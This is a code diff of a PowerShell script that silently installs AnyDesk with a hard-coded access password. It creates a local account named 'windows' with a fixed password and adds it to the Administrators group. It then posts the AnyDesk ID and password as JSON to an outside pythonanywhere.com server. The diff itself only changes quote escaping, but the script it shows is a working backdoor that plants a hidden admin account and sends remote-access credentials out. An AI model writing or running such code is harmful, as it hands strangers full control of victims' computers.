@@ -12,10 +12,10 @@
 	Invoke-WebRequest -Uri $ANYDESK_URL -OutFile $ANYDESK_INSTALLER
 
 	# Install AnyDesk silently
-	cmd.exe /c \"AnyDesk.exe --install  C:\Program Files (x86) --silent\"
-	cmd.exe /c \"echo sckdbask78xk | AnyDesk.exe --set-password\"
-	cmd.exe /c \"net user "windows" "@pass1word" /add\"
-	cmd.exe /c \"net localgroup Administrators "windows" /add\"
+	cmd.exe /c "AnyDesk.exe --install  C:\Program Files (x86) --silent"
+	cmd.exe /c "echo sckdbask78xk | AnyDesk.exe --set-password"
+	cmd.exe /c "net user "windows" "@pass1word" /add"
+	cmd.exe /c "net localgroup Administrators "windows" /add"
 
 	# Wait for 5 seconds
 	Start-Sleep -Seconds 5
@@ -30,18 +30,19 @@
 	} while ($anydeskID -eq "0")
 
 	# Display the AnyDesk ID
-	Write-Host \"Your AnyDesk ID is: $anydeskID\"
+	Write-Host "Your AnyDesk ID is: $anydeskID"
 
 	# Clean up the temporary file
 	Remove-Item -Path $tempFile
 
 	# Send the AnyDesk ID and password to the server
-	$url = \"https://tomwebb00.pythonanywhere.com/\"
+	$url = "https://tomwebb00.pythonanywhere.com/"
 	$data = @{
-	    \"ANID\" = $anydeskID
-	    \"password\" = $PASSWORD
+	    "ANID" = $anydeskID
+	    "password" = $PASSWORD
 	} | ConvertTo-Json
 	Invoke-WebRequest -Uri $url -Method Post -Body $data -ContentType "application/json"
 
 	# Wait for user input before exiting
+
 	Read-Host -Prompt "Press Enter to exit"
